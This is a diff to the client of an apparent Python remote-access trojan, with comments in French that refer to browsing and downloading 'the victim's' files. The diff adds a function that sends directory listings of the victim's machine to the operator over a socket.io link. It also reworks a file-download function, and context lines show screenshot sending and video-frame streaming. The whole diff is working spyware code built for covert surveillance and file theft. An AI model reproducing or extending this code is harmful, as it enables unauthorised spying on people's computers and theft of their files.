@@ -10,7 +10,6 @@ import pyaudio
 import pyautogui
 import pyperclip
 from PIL import Image
-from requests import get
 
 
 def take_and_send_screenshot(sio):
@@ -126,8 +125,8 @@ def gen_frames(sio):
         cv2.destroyAllWindows()
 
 
-#On dois pouvoir se balader dans les fichier de la victime pour télécharger un fichier donner
-def download_file(file_path):
+# On doit pouvoir se balader dans les fichier de la victime pour télécharger un fichier donner
+def download_file(file_path, sio):
     print(file_path)
     try:
         # Ensure file_path is a string and correct path separators
@@ -142,3 +141,15 @@ def download_file(file_path):
             print("Fichier introuvable")
     except Exception as e:
         print(f"Échec de l'envoi du fichier: {e}")
+
+
+def list_directory(dir_path, sio):
+    try:
+        if os.path.exists(dir_path) and os.path.isdir(dir_path):
+            files_and_dirs = os.listdir(dir_path)
+            sio.emit('directory_listing_response', {'directory_listing': files_and_dirs})
+            print(f"Liste des fichiers et dossiers de {dir_path} envoyée")
+        else:
+            print("Chemin du répertoire invalide ou inexistant")
+    except Exception as e:
+        print(f"Échec de la liste des fichiers et dossiers: {e}")
